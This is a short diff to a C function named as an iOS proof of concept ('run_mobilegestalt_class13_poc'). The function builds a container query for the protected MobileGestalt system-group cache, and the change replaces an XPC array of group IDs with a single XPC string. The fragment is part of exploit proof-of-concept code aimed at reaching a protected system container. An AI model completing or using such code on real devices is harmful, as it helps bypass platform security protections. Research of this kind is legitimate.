@@ -210,12 +210,11 @@ int run_mobilegestalt_class13_poc(void)
         return 3;
     }
     query_set_class(query, 13);                 // system-group container
-    xpc_object_t groups = xpc_array_create(NULL, 0);
-    xpc_array_set_string(groups, XPC_ARRAY_APPEND,
+    xpc_object_t group = xpc_string_create(
         "systemgroup.com.apple.mobilegestaltcache");
-    query_set_group_ids(query, groups);
+    query_set_group_ids(query, group);
 #if !OS_OBJECT_USE_OBJC
-    xpc_release(groups);
+    xpc_release(group);
 #endif
     query_set_flags(query, UINT64_C(0x8100000000));
     BOOL scopedPart = query_set_part != NULL;
